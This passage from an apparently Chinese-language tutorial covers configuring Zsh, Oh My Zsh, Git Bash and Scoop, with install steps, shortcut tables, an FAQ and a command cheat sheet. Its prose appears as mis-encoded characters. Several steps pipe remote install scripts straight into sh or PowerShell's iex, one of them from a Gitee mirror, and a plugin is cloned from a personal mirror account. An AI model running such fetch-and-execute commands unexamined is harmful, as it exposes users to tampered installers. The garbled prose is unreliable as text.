âœ“ è‰¯å¥½çš„æ€§èƒ½
âœ“ ä¸ Windows æ–‡ä»¶ç³»ç»Ÿäº’é€š
</code></pre>
<h5 data-id="heading-88">âš¡ é‡åº¦ç”¨æˆ·ï¼ˆè¿½æ±‚æè‡´ï¼‰</h5>
<p><strong>æ¨èæ–¹æ¡ˆ</strong>ï¼šWSL + Zsh + Tmux + Neovim</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸“ä¸šå¼€å‘é…ç½®</span>
âœ“ ç»ˆç«¯å¤ç”¨ï¼ˆTmuxï¼‰
âœ“ å¼ºå¤§çš„ç¼–è¾‘å™¨ï¼ˆNeovimï¼‰
âœ“ å…¨å¥— Zsh æ’ä»¶
âœ“ Docker åŸç”Ÿæ”¯æŒ
</code></pre>
<hr/>
<h3 data-id="heading-89">2.5 å¿«æ·é”®é€ŸæŸ¥</h3>






































































<table><thead><tr><th>å¿«æ·é”®</th><th>åŠŸèƒ½</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>Ctrl + R</code></td><td>fzf æœç´¢å†å²å‘½ä»¤</td><td>è¾“å…¥å…³é”®è¯å®æ—¶è¿‡æ»¤</td></tr><tr><td><code>Ctrl + T</code></td><td>fzf æœç´¢æ–‡ä»¶</td><td>å½“å‰ç›®å½•æ¨¡ç³Šæœç´¢</td></tr><tr><td><code>Alt + C</code></td><td>fzf æœç´¢ç›®å½•</td><td>å¿«é€Ÿåˆ‡æ¢ç›®å½•</td></tr><tr><td><code>Ctrl + A</code></td><td>å…‰æ ‡ç§»åˆ°è¡Œé¦–</td><td>ç¼–è¾‘å¿«æ·é”®</td></tr><tr><td><code>Ctrl + E</code></td><td>å…‰æ ‡ç§»åˆ°è¡Œå°¾</td><td>ç¼–è¾‘å¿«æ·é”®</td></tr><tr><td><code>Ctrl + U</code></td><td>åˆ é™¤å…‰æ ‡å‰æ‰€æœ‰å­—ç¬¦</td><td>å¿«é€Ÿæ¸…é™¤</td></tr><tr><td><code>Ctrl + K</code></td><td>åˆ é™¤å…‰æ ‡åæ‰€æœ‰å­—ç¬¦</td><td>å¿«é€Ÿæ¸…é™¤</td></tr><tr><td><code>Ctrl + W</code></td><td>åˆ é™¤å…‰æ ‡å‰ä¸€ä¸ªå•è¯</td><td>é€è¯åˆ é™¤</td></tr><tr><td><code>Ctrl + L</code></td><td>æ¸…å±</td><td>ç­‰åŒäº clear</td></tr><tr><td><code>Alt + .</code></td><td>ç²˜è´´ä¸Šä¸€æ¡å‘½ä»¤æœ€åå‚æ•°</td><td>å¿«é€Ÿå¼•ç”¨</td></tr><tr><td><code>Ctrl + C</code></td><td>ä¸­æ–­å½“å‰å‘½ä»¤</td><td>å¼ºåˆ¶åœæ­¢</td></tr><tr><td><code>Ctrl + D</code></td><td>é€€å‡ºç»ˆç«¯</td><td>ç­‰åŒäº exit</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-90">2.6 Scoop åŒ…ç®¡ç†å™¨ï¼ˆæ¨èï¼‰</h3>
<h4 data-id="heading-91">2.6.1 å®‰è£… Scoop</h4>
<pre><code class="hljs language-powershell" lang="powershell"># åœ¨ PowerShell ä¸­æ‰§è¡Œ
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
irm get.scoop.sh | iex
</code></pre>
<h4 data-id="heading-92">2.6.2 ä½¿ç”¨ Scoop å®‰è£…å·¥å…·</h4>
<pre><code class="hljs language-powershell" lang="powershell"># ä¸€é”®å®‰è£…æ‰€æœ‰æ¨èå·¥å…·
scoop install git
scoop install bat
scoop install ripgrep
scoop install fd
scoop install fzf
scoop install starship
scoop install neovim
</code></pre>
<hr/>
<h2 data-id="heading-93">ä¸‰ã€æ€»ç»“ä¸å»ºè®®</h2>
<h3 data-id="heading-94">3.0 æ–°æ‰‹å¿«é€Ÿä¸Šæ‰‹è·¯çº¿å›¾</h3>
<h4 data-id="heading-95">ğŸ¯ æˆ‘åº”è¯¥é€‰å“ªä¸ªæ–¹æ¡ˆï¼Ÿ</h4>
<pre><code class="hljs language-markdown" lang="markdown">ä½ æ˜¯ä»€ä¹ˆç³»ç»Ÿï¼Ÿ
â”œâ”€ macOS 
â”‚  â””â”€ é€‰æ‹©ï¼šZsh + Oh My Zshï¼ˆç³»ç»Ÿè‡ªå¸¦ zshï¼‰
â”‚     â””â”€ è·³è½¬åˆ°ï¼š1.2.1.1 èŠ‚
â”‚
â”œâ”€ Linux
â”‚  â””â”€ é€‰æ‹©ï¼šZsh + Oh My Zshï¼ˆæœ€ä½³ä½“éªŒï¼‰
â”‚     â””â”€ è·³è½¬åˆ°ï¼š1.2.1.1 èŠ‚
â”‚
â””â”€ Windows
   â”œâ”€ å¼€å‘è€…/å­¦ç”Ÿ
   â”‚  â””â”€ é€‰æ‹©ï¼šWSL + Zshï¼ˆæ¨èâ­â­â­â­â­ï¼‰
   â”‚     â””â”€ è·³è½¬åˆ°ï¼š1.2.2 æ–¹æ¡ˆä¸€
   â”‚
   â””â”€ è½»åº¦ç”¨æˆ·/åªç”¨ Git
<span class="hljs-code">      â””â”€ é€‰æ‹©ï¼šGit Bash + åŸºç¡€å¢å¼ºï¼ˆç®€å•å®ç”¨ï¼‰
         â””â”€ è·³è½¬åˆ°ï¼š2.1 èŠ‚
</span></code></pre>
<hr/>
<h3 data-id="heading-96">3.1 å¿«é€Ÿå¼€å§‹å»ºè®®</h3>
<h4 data-id="heading-97">æ–¹æ¡ˆAï¼šZsh å®Œæ•´å®‰è£…ï¼ˆ15 åˆ†é’Ÿï¼‰</h4>
<p><strong>é€‚åˆï¼šmacOSã€Linuxã€Windows (WSL)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¬¬1æ­¥ï¼šå®‰è£… Zshï¼ˆ2åˆ†é’Ÿï¼‰</span>
<span class="hljs-comment"># macOS</span>
brew install zsh

<span class="hljs-comment"># Linux</span>
sudo apt install zsh

<span class="hljs-comment"># ç¬¬2æ­¥ï¼šå®‰è£… Oh My Zshï¼ˆ2åˆ†é’Ÿï¼‰</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>

<span class="hljs-comment"># ç¬¬3æ­¥ï¼šå®‰è£…å¿…å¤‡æ’ä»¶ï¼ˆ5åˆ†é’Ÿï¼‰</span>
<span class="hljs-comment"># 1. è‡ªåŠ¨è¡¥å…¨</span>
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions

<span class="hljs-comment"># 2. è¯­æ³•é«˜äº®</span>
git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-syntax-highlighting

<span class="hljs-comment"># 3. æ¨¡ç³Šæœç´¢</span>
brew install fzf  <span class="hljs-comment"># macOS</span>
sudo apt install fzf  <span class="hljs-comment"># Linux</span>

<span class="hljs-comment"># ç¬¬4æ­¥ï¼šç¼–è¾‘é…ç½®ï¼ˆ3åˆ†é’Ÿï¼‰</span>
vim ~/.zshrc
<span class="hljs-comment"># æ‰¾åˆ° plugins=() æ”¹ä¸ºï¼š</span>
<span class="hljs-comment"># plugins=(git zsh-autosuggestions zsh-syntax-highlighting fzf)</span>

<span class="hljs-comment"># ç¬¬5æ­¥ï¼šç”Ÿæ•ˆï¼ˆ1åˆ†é’Ÿï¼‰</span>
<span class="hljs-built_in">source</span> ~/.zshrc

<span class="hljs-comment"># âœ… å®Œæˆï¼å¼€å§‹ä½“éªŒå§</span>
</code></pre>
<hr/>
<h4 data-id="heading-98">æ–¹æ¡ˆBï¼šGit Bash å¢å¼ºï¼ˆ10 åˆ†é’Ÿï¼‰</h4>
<p><strong>é€‚åˆï¼šWindows ç”¨æˆ·</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¬¬1æ­¥ï¼šç¡®ä¿å·²å®‰è£… Git Bashï¼ˆå¦‚æœæ²¡æœ‰ï¼Œä¸‹è½½å®‰è£…ï¼šgit-scm.comï¼‰</span>

<span class="hljs-comment"># ç¬¬2æ­¥ï¼šå®‰è£… Scoop åŒ…ç®¡ç†å™¨ï¼ˆåœ¨ PowerShell ä¸­æ‰§è¡Œï¼Œ3åˆ†é’Ÿï¼‰</span>
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
irm get.scoop.sh | iex

<span class="hljs-comment"># ç¬¬3æ­¥ï¼šå®‰è£…å¿…å¤‡å·¥å…·ï¼ˆåœ¨ PowerShell ä¸­ï¼Œ3åˆ†é’Ÿï¼‰</span>
scoop install fzf bat ripgrep

<span class="hljs-comment"># ç¬¬4æ­¥ï¼šé…ç½® Git Bashï¼ˆåœ¨ Git Bash ä¸­ï¼Œ2åˆ†é’Ÿï¼‰</span>
<span class="hljs-comment"># å®‰è£… z å’Œ fzf</span>
git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install
curl -fsSL https://raw.githubusercontent.com/rupa/z/master/z.sh -o ~/z.sh

<span class="hljs-comment"># ç¬¬5æ­¥ï¼šåˆ›å»ºé…ç½®æ–‡ä»¶ï¼ˆ2åˆ†é’Ÿï¼‰</span>
<span class="hljs-built_in">cat</span> &gt;&gt; ~/.bashrc &lt;&lt; <span class="hljs-string">'EOF'</span>
<span class="hljs-comment"># åŠ è½½å·¥å…·</span>
[ -f ~/z.sh ] &amp;&amp; <span class="hljs-built_in">source</span> ~/z.sh
[ -f ~/.fzf.bash ] &amp;&amp; <span class="hljs-built_in">source</span> ~/.fzf.bash

<span class="hljs-comment"># Git åˆ«å</span>
<span class="hljs-built_in">alias</span> gst=<span class="hljs-string">'git status'</span>
<span class="hljs-built_in">alias</span> gaa=<span class="hljs-string">'git add --all'</span>
<span class="hljs-built_in">alias</span> gcm=<span class="hljs-string">'git commit -m'</span>
<span class="hljs-built_in">alias</span> gp=<span class="hljs-string">'git push'</span>
<span class="hljs-built_in">alias</span> gl=<span class="hljs-string">'git pull'</span>
EOF

<span class="hljs-built_in">source</span> ~/.bashrc

<span class="hljs-comment"># âœ… å®Œæˆï¼</span>
</code></pre>
<hr/>
<h3 data-id="heading-99">3.2 å­¦ä¹ è·¯å¾„å»ºè®®</h3>
<h4 data-id="heading-100">ç¬¬ 1 å¤©ï¼šç†Ÿæ‚‰åŸºç¡€åŠŸèƒ½</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. è¯•è¯•è‡ªåŠ¨è¡¥å…¨</span>
<span class="hljs-built_in">cd</span> ~/Doc[æŒ‰ â†’ é”®]  <span class="hljs-comment"># åº”è¯¥è‡ªåŠ¨è¡¥å…¨ä¸º Documents</span>

<span class="hljs-comment"># 2. çœ‹çœ‹è¯­æ³•é«˜äº®</span>
<span class="hljs-built_in">ls</span>    <span class="hljs-comment"># æ­£ç¡®å‘½ä»¤æ˜¾ç¤ºç»¿è‰²</span>
lsss  <span class="hljs-comment"># é”™è¯¯å‘½ä»¤æ˜¾ç¤ºçº¢è‰²</span>

<span class="hljs-comment"># 3. ç”¨ç”¨ Git åˆ«å</span>
gst   <span class="hljs-comment"># ä»£æ›¿ git status</span>
gaa   <span class="hljs-comment"># ä»£æ›¿ git add --all</span>
</code></pre>
<h4 data-id="heading-101">ç¬¬ 2-3 å¤©ï¼šæŒæ¡æœç´¢å’Œè·³è½¬</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ¨¡ç³Šæœç´¢å†å²ï¼ˆfzfï¼‰</span>
<span class="hljs-comment"># æŒ‰ Ctrl+Rï¼Œè¾“å…¥å…³é”®è¯æœç´¢å†å²å‘½ä»¤</span>

<span class="hljs-comment"># 2. ç›®å½•è·³è½¬ï¼ˆzï¼‰</span>
<span class="hljs-comment"># å…ˆ cd åˆ°å‡ ä¸ªå¸¸ç”¨ç›®å½•</span>
<span class="hljs-built_in">cd</span> ~/Documents/Projects
<span class="hljs-built_in">cd</span> ~/Downloads
<span class="hljs-comment"># ä¹‹åå¯ä»¥å¿«é€Ÿè·³è½¬</span>
z proj  <span class="hljs-comment"># è·³åˆ° Projects</span>
z down  <span class="hljs-comment"># è·³åˆ° Downloads</span>

<span class="hljs-comment"># 3. æœç´¢æ–‡ä»¶ï¼ˆfzfï¼‰</span>
<span class="hljs-comment"># æŒ‰ Ctrl+Tï¼Œè¾“å…¥æ–‡ä»¶åå¿«é€Ÿå®šä½</span>
</code></pre>
<h4 data-id="heading-102">ç¬¬ 4-7 å¤©ï¼šè‡ªå®šä¹‰é…ç½®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ·»åŠ è‡ªå·±çš„åˆ«å</span>
vim ~/.zshrc  <span class="hljs-comment"># æˆ– ~/.bashrc</span>
<span class="hljs-comment"># æ·»åŠ ï¼š</span>
<span class="hljs-comment"># alias work='cd ~/Documents/Projects'</span>
<span class="hljs-comment"># alias blog='cd ~/Documents/Blog'</span>

<span class="hljs-comment"># 2. åˆ›å»ºå®ç”¨å‡½æ•°</span>
<span class="hljs-comment"># æ·»åŠ åˆ°é…ç½®æ–‡ä»¶ï¼š</span>
<span class="hljs-function"><span class="hljs-title">mkcd</span></span>() {
    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
}
<span class="hljs-comment"># ç”¨æ³•ï¼šmkcd test  # åˆ›å»ºå¹¶è¿›å…¥ test ç›®å½•</span>
</code></pre>
<h4 data-id="heading-103">ç¬¬ 2 å‘¨+ï¼šè¿›é˜¶ä¼˜åŒ–</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å°è¯•ä¸åŒä¸»é¢˜</span>
<span class="hljs-comment"># Zsh: å®‰è£… powerlevel10k</span>
<span class="hljs-comment"># Git Bash: å®‰è£… starship</span>

<span class="hljs-comment"># 2. æ¢ç´¢æ›´å¤šæ’ä»¶</span>
<span class="hljs-comment"># docker, kubectl, npm, yarn ç­‰</span>

<span class="hljs-comment"># 3. å­¦ä¹ é«˜çº§å¿«æ·é”®</span>
<span class="hljs-comment"># Alt+. : ç²˜è´´ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åå‚æ•°</span>
<span class="hljs-comment"># Ctrl+U : åˆ é™¤æ•´è¡Œ</span>
<span class="hljs-comment"># Ctrl+W : åˆ é™¤ä¸€ä¸ªå•è¯</span>
</code></pre>
<h3 data-id="heading-104">3.3 å¸¸è§é—®é¢˜è¯¦è§£</h3>
<h4 data-id="heading-105">Q1: æˆ‘å·²ç»æœ‰ Zshï¼Œè¿˜éœ€è¦è£… Oh My Zsh å—ï¼Ÿ</h4>
<p><strong>ç­”ï¼šå¼ºçƒˆå»ºè®®è£…ï¼</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¸è£… Oh My Zshï¼ˆç—›è‹¦æ¨¡å¼ï¼‰</span>
<span class="hljs-comment"># - éœ€è¦æ‰‹åŠ¨ä¸‹è½½æ¯ä¸ªæ’ä»¶</span>
<span class="hljs-comment"># - éœ€è¦æ‰‹åŠ¨å†™é…ç½®åŠ è½½æ’ä»¶</span>
<span class="hljs-comment"># - åˆ‡æ¢ä¸»é¢˜å¾ˆéº»çƒ¦</span>

<span class="hljs-comment"># è£…äº† Oh My Zshï¼ˆç®€å•æ¨¡å¼ï¼‰</span>
<span class="hljs-comment"># - æ’ä»¶ä¸€è¡Œå‘½ä»¤æå®š</span>
<span class="hljs-comment"># - é…ç½®ç»Ÿä¸€ç®¡ç†åœ¨ ~/.zshrc</span>
<span class="hljs-comment"># - ä¸»é¢˜éšä¾¿åˆ‡æ¢</span>
</code></pre>
<p><strong>ç›´æ¥è·³è½¬åˆ°ï¼š<a href="#1212-%E5%B7%B2%E6%9C%89-zsh%E5%8F%AA%E8%A3%85-oh-my-zsh" title="#1212-%E5%B7%B2%E6%9C%89-zsh%E5%8F%AA%E8%A3%85-oh-my-zsh">1.2.1.2 å·²æœ‰ Zshï¼Œåªè£… Oh My Zsh</a></strong></p>
<hr/>
<h4 data-id="heading-106">Q2: æˆ‘è£…äº† Git Bashï¼Œèƒ½ç”¨ Zsh æ’ä»¶å—ï¼Ÿ</h4>
<p><strong>ç­”ï¼šä¸èƒ½ç›´æ¥ç”¨ï¼Œä½†æœ‰æ›¿ä»£æ–¹æ¡ˆã€‚</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">Git Bash = Bash Shell
Zsh æ’ä»¶ = åªèƒ½åœ¨ Zsh ä¸Šè¿è¡Œ

è§£å†³æ–¹æ¡ˆï¼š
<span class="hljs-bullet">1.</span> ä½¿ç”¨ Git Bash ä¸“ç”¨å·¥å…·ï¼ˆfzfã€batã€z ç­‰ï¼‰â† æ¨è
<span class="hljs-bullet">2.</span> åœ¨ Git Bash ä¸­å®‰è£… Zshï¼ˆå¤æ‚ï¼Œä¸æ¨èï¼‰
<span class="hljs-bullet">3.</span> ä½¿ç”¨ WSL + Zshï¼ˆæœ€ä½³æ–¹æ¡ˆï¼‰
</code></pre>
<p><strong>è·³è½¬åˆ°ï¼š<a href="#21-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE" title="#21-%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">2.1 Git Bash å®‰è£…ä¸é…ç½®</a></strong></p>
<hr/>
<h4 data-id="heading-107">Q3: é…ç½®æ–‡ä»¶ .zshrc å’Œ .bashrc æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h4>
<p><strong>ç­”ï¼šå®ƒä»¬æ˜¯ä¸åŒ Shell çš„é…ç½®æ–‡ä»¶ã€‚</strong></p>




















<table><thead><tr><th>é…ç½®æ–‡ä»¶</th><th>å¯¹åº” Shell</th><th>åœ¨å“ªç¼–è¾‘</th></tr></thead><tbody><tr><td><code>~/.zshrc</code></td><td>Zsh</td><td><code>vim ~/.zshrc</code></td></tr><tr><td><code>~/.bashrc</code></td><td>Bash</td><td><code>vim ~/.bashrc</code></td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„ Shell</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span>

<span class="hljs-comment"># /bin/zsh æˆ– /usr/bin/zsh â†’ ç¼–è¾‘ .zshrc</span>
<span class="hljs-comment"># /bin/bash â†’ ç¼–è¾‘ .bashrc</span>
</code></pre>
<hr/>
<h4 data-id="heading-108">Q4: æ’ä»¶è£…äº†ä¸ç”Ÿæ•ˆæ€ä¹ˆåŠï¼Ÿ</h4>
<p><strong>ç­”ï¼šæŒ‰ä»¥ä¸‹æ­¥éª¤æ’æŸ¥ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ­¥éª¤1: æ£€æŸ¥æ’ä»¶æ˜¯å¦ä¸‹è½½æˆåŠŸ</span>
<span class="hljs-built_in">ls</span> ~/.oh-my-zsh/custom/plugins/
<span class="hljs-comment"># åº”è¯¥çœ‹åˆ° zsh-autosuggestions ç­‰ç›®å½•</span>

<span class="hljs-comment"># æ­¥éª¤2: æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦æ·»åŠ </span>
<span class="hljs-built_in">cat</span> ~/.zshrc | grep plugins
<span class="hljs-comment"># åº”è¯¥çœ‹åˆ°ï¼šplugins=(git zsh-autosuggestions ...)</span>

<span class="hljs-comment"># æ­¥éª¤3: é‡æ–°åŠ è½½é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.zshrc

<span class="hljs-comment"># æ­¥éª¤4: é‡å¯ç»ˆç«¯</span>
<span class="hljs-comment"># å¦‚æœè¿˜ä¸è¡Œï¼Œé‡å¯ç»ˆç«¯è¯•è¯•</span>

<span class="hljs-comment"># æ­¥éª¤5: æŸ¥çœ‹é”™è¯¯ä¿¡æ¯</span>
<span class="hljs-comment"># æœ‰äº›æ’ä»¶éœ€è¦é¢å¤–ä¾èµ–ï¼Œçœ‹ç»ˆç«¯å¯åŠ¨æ—¶çš„æŠ¥é”™</span>
</code></pre>
<hr/>
<h4 data-id="heading-109">Q5: Windows ç”¨ WSL å¥½è¿˜æ˜¯ Git Bash å¥½ï¼Ÿ</h4>
<p><strong>ç­”ï¼šçœ‹ä½ çš„éœ€æ±‚ã€‚</strong></p>



































<table><thead><tr><th>å¯¹æ¯”é¡¹</th><th>WSL + Zsh</th><th>Git Bash</th></tr></thead><tbody><tr><td><strong>åŠŸèƒ½</strong></td><td>å®Œæ•´ Linux ç¯å¢ƒ</td><td>è½»é‡ Git å·¥å…·</td></tr><tr><td><strong>æ’ä»¶</strong></td><td>å…¨å…¼å®¹ â­â­â­â­â­</td><td>éƒ¨åˆ†å…¼å®¹ â­â­â­</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>å¥½</td><td>ä¸€èˆ¬</td></tr><tr><td><strong>æ–‡ä»¶è®¿é—®</strong></td><td>Windows æ–‡ä»¶åœ¨ /mnt/c/</td><td>ç›´æ¥è®¿é—®</td></tr><tr><td><strong>é€‚åˆäººç¾¤</strong></td><td>å¼€å‘è€…ã€å­¦ç”Ÿ</td><td>è½»åº¦ Git ç”¨æˆ·</td></tr></tbody></table>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>åšå¼€å‘ã€å­¦ç¼–ç¨‹ â†’ <strong>WSL + Zsh</strong></li>
<li>åªç”¨ Gitã€å¶å°”å†™è„šæœ¬ â†’ <strong>Git Bash</strong></li>
</ul>
<hr/>
<h4 data-id="heading-110">Q6: macOS è‡ªå¸¦ Zshï¼Œè¿˜éœ€è¦é‡æ–°å®‰è£…å—ï¼Ÿ</h4>
<p><strong>ç­”ï¼šä¸éœ€è¦ï¼Œä½†å»ºè®®å‡çº§ã€‚</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰ç‰ˆæœ¬</span>
zsh --version

<span class="hljs-comment"># macOS è‡ªå¸¦ç‰ˆæœ¬é€šå¸¸æ˜¯ 5.8</span>
<span class="hljs-comment"># æœ€æ–°ç‰ˆæœ¬æ˜¯ 5.9</span>

<span class="hljs-comment"># å¦‚æœæƒ³å‡çº§ï¼ˆå¯é€‰ï¼‰</span>
brew install zsh

<span class="hljs-comment"># ç„¶åç›´æ¥å®‰è£… Oh My Zsh å³å¯</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span>
</code></pre>
<hr/>
<h4 data-id="heading-111">Q7: å®‰è£…è„šæœ¬è¢«å¢™æ— æ³•è®¿é—®æ€ä¹ˆåŠï¼Ÿ</h4>
<p><strong>ç­”ï¼šä½¿ç”¨é•œåƒæˆ–æ‰‹åŠ¨å®‰è£…ã€‚</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹æ³•1: ä½¿ç”¨ Gitee é•œåƒï¼ˆæ¨èï¼‰</span>
<span class="hljs-comment"># Oh My Zsh</span>
sh -c <span class="hljs-string">"<span class="hljs-subst">$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)</span>"</span>

<span class="hljs-comment"># zsh-autosuggestions</span>
git <span class="hljs-built_in">clone</span> https://gitee.com/myl9361/zsh-autosuggestions.git <span class="hljs-variable">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions

<span class="hljs-comment"># æ–¹æ³•2: ä½¿ç”¨ä»£ç†</span>
<span class="hljs-built_in">export</span> https_proxy=http://127.0.0.1:7890  <span class="hljs-comment"># æ”¹æˆä½ çš„ä»£ç†åœ°å€</span>
<span class="hljs-comment"># ç„¶åæ­£å¸¸æ‰§è¡Œå®‰è£…å‘½ä»¤</span>

<span class="hljs-comment"># æ–¹æ³•3: æ‰‹åŠ¨ä¸‹è½½ä¸Šä¼ </span>
<span class="hljs-comment"># åœ¨èƒ½è®¿é—®çš„ç”µè„‘ä¸‹è½½ï¼Œä¼ åˆ°ç›®æ ‡ç”µè„‘ä¸Š</span>
</code></pre>
<hr/>
<h4 data-id="heading-112">Q8: å¸è½½ Oh My Zsh ä¼šå½±å“ç³»ç»Ÿå—ï¼Ÿ</h4>
<p><strong>ç­”ï¼šä¸ä¼šï¼Œå®Œå…¨å®‰å…¨ã€‚</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¸è½½ Oh My Zsh</span>
uninstall_oh_my_zsh

<span class="hljs-comment"># ä¼šåšä»¥ä¸‹äº‹æƒ…ï¼š</span>
<span class="hljs-comment"># 1. åˆ é™¤ ~/.oh-my-zsh ç›®å½•</span>
<span class="hljs-comment"># 2. æ¢å¤åŸæ¥çš„ .zshrc é…ç½®ï¼ˆä»å¤‡ä»½æ–‡ä»¶ .zshrc.pre-oh-my-zshï¼‰</span>
<span class="hljs-comment"># 3. ç³»ç»Ÿä¸å—å½±å“ï¼Œå¯ä»¥ç»§ç»­ç”¨ zsh æˆ–åˆ‡å› bash</span>
</code></pre>
<hr/>
<h3 data-id="heading-113">3.4 å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ===== Zsh ç®¡ç† =====</span>
omz update              <span class="hljs-comment"># æ›´æ–° Oh My Zsh</span>
omz reload              <span class="hljs-comment"># é‡è½½é…ç½®</span>
omz plugin list         <span class="hljs-comment"># åˆ—å‡ºæ‰€æœ‰å¯ç”¨æ’ä»¶</span>

<span class="hljs-comment"># ===== é…ç½®ç®¡ç† =====</span>
vim ~/.zshrc            <span class="hljs-comment"># ç¼–è¾‘ Zsh é…ç½®</span>
vim ~/.bashrc           <span class="hljs-comment"># ç¼–è¾‘ Bash é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.zshrc         <span class="hljs-comment"># é‡è½½ Zsh é…ç½®</span>
<span class="hljs-built_in">source</span> ~/.bashrc        <span class="hljs-comment"># é‡è½½ Bash é…ç½®</span>

<span class="hljs-comment"># ===== Git å¿«æ·å‘½ä»¤ =====</span>
gst                     <span class="hljs-comment"># git status</span>
gaa                     <span class="hljs-comment"># git add --all</span>
gcm <span class="hljs-string">"msg"</span>               <span class="hljs-comment"># git commit -m "msg"</span>
gp                      <span class="hljs-comment"># git push</span>
gl                      <span class="hljs-comment"># git pull</span>
glog                    <span class="hljs-comment"># git log --graph</span>

<span class="hljs-comment"># ç»„åˆä½¿ç”¨</span>
gaa &amp;&amp; gcm <span class="hljs-string">"fix bug"</span> &amp;&amp; gp  <span class="hljs-comment"># ä¸€é”®æäº¤æ¨é€</span>

<span class="hljs-comment"># ===== ç›®å½•è·³è½¬ =====</span>
z é¡¹ç›®å                 <span class="hljs-comment"># å¿«é€Ÿè·³è½¬åˆ°é¡¹ç›®</span>
j ç›®å½•                   <span class="hljs-comment"># autojump è·³è½¬</span>
..                      <span class="hljs-comment"># cd ..</span>
...                     <span class="hljs-comment"># cd ../..</span>
-                       <span class="hljs-comment"># è¿”å›ä¸Šä¸€ä¸ªç›®å½•</span>

<span class="hljs-comment"># ===== æœç´¢ =====</span>
Ctrl+R                  <span class="hljs-comment"># fzf æœç´¢å†å²å‘½ä»¤</span>
Ctrl+T                  <span class="hljs-comment"># fzf æœç´¢æ–‡ä»¶</span>
Ctrl+Alt+C              <span class="hljs-comment"># fzf æœç´¢ç›®å½•</span>
rg <span class="hljs-string">"å…³é”®è¯"</span>              <span class="hljs-comment"># ripgrep æœç´¢å†…å®¹</span>
fd æ–‡ä»¶å                <span class="hljs-comment"># fd æŸ¥æ‰¾æ–‡ä»¶</span>

<span class="hljs-comment"># ===== å®ç”¨æŠ€å·§ =====</span>
!! <span class="hljs-comment"># æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤</span>
!$ <span class="hljs-comment"># ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åå‚æ•°</span>
Alt+. <span class="hljs-comment"># ç²˜è´´ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åå‚æ•°</span>
</code></pre>
<h3 data-id="heading-114">3.5 è¿›é˜¶èµ„æº</h3>
<h4 data-id="heading-115">å®˜æ–¹æ–‡æ¡£</h4>
<ul>
<li><strong>Oh My Zsh å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fohmyz.sh%2F" target="_blank" title="https://ohmyz.sh/" ref="nofollow noopener noreferrer">ohmyz.sh/</a></li>
<li><strong>Zsh å®˜æ–¹æ–‡æ¡£</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fzsh.sourceforge.io%2FDoc%2F" target="_blank" title="https://zsh.sourceforge.io/Doc/" ref="nofollow noopener noreferrer">zsh.sourceforge.io/Doc/</a></li>
<li><strong>Starship å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fstarship.rs%2Fzh-CN%2F" target="_blank" title="https://starship.rs/zh-CN/" ref="nofollow noopener noreferrer">starship.rs/zh-CN/</a></li>
</ul>
<h4 data-id="heading-116">æ’ä»¶èµ„æº</h4>
<ul>
